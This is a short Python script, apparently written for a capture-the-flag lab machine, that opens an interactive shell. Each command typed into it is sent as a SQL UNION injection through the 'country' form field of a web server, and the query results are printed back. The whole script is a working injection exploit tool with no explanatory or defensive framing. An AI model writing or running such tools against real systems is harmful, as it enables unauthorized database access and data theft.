#!/usr/bin/env python3

import requests
from cmd import Cmd
import random

class Shell(Cmd):
    prompt = "> "

    def default(self, args):
        # The vulnerable injection point
        inj = f"' UNION {args}-- -"

        # Random username for each request
        user = f"elliot{random.randrange(10000,99999)}"

        data = {
            "username": user,
            "country": inj
        }

        r = requests.post("http://10.10.11.116/", data=data)

        # Print HTML <li> entries (the site prints them for errors/results)
        for line in r.text.split("<li>")[1:]:
            print(line.split("</li>")[0])

Shell().cmdloop()
